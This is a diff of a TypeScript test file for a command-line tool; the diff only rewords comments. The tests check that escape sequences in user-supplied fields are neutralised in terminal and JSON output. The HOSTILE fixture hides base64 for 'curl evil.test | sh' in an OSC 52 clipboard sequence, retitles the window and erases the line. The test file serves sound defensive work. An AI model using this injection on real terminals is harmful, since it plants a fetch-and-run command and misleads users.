@@ -137,7 +137,7 @@ const browserOnly = (reads?: string) => ({
   refusal: { code: 'NEEDS_BROWSER_SESSION', fix: reads === undefined ? 'Open this from the app; a token cannot change what this record is.' : `Open this from the app; a token cannot ${reads}.`, at: 'principal' },
 });
 
-/* AUDIT THIRTY-SEVEN, FINDING 3, BYTE FOR BYTE: what a member at `append` wrote into a row, and what a `set_var` step
+/* A REAL ATTACK, BYTE FOR BYTE: what a member at `append` wrote into a row, and what a `set_var` step
    filled from it. OSC 52 asks a terminal to put `curl evil.test | sh` on the clipboard, OSC 0 retitles the window, and
    the CR and CSI 2K erase the line it arrived on. `automations show` handed every byte of it to the owner's terminal. */
 const HOSTILE = 'Invoice 7\u001b]52;c;Y3VybCBldmlsLnRlc3QgfCBzaA==\u0007\u001b]0;BrainDog: all clear\u0007\r\u001b[2K';
@@ -307,7 +307,7 @@ test('scripts list: none is one sentence, and a verb it does not know is refused
   assert.equal(h.seen.length, seen, 'a bad flag or verb sends nothing');
 });
 
-/** CHASE with every string a member or a pack could have supplied carrying the audit's bytes. */
+/** CHASE with every string a member or a pack could have supplied carrying the attack's bytes. */
 const HOSTILE_CHASE = {
   ...CHASE,
   name: HOSTILE,
@@ -406,7 +406,7 @@ test('braindog automations show --json: the escape bytes stay in the value, JSON
   const out = await ran(['automations', 'show', 'chase', '--json'], { ...process.env, ...h.env }, h.dir);
   assert.equal(out.code, 0, out.stderr);
   /* C0 ONLY, BECAUSE THAT IS WHAT JSON.stringify ESCAPES: measured, the U+009B in `project` leaves `main.ts`'s `emit` as
-     the raw bytes C2 9B, since JSON allows it unescaped. The audit's ESC, BEL and CR are all C0 and all escaped. */
+     the raw bytes C2 9B, since JSON allows it unescaped. The ESC, BEL and CR above are all C0 and all escaped. */
   assert.equal(/[\u0000-\u001f]/.test(out.stdout.trimEnd()), false, `stdout carries a raw control character: ${JSON.stringify(out.stdout)}`);
   assert.deepEqual(JSON.parse(out.stdout), { ok: true, value: HOSTILE_CHASE });
 });
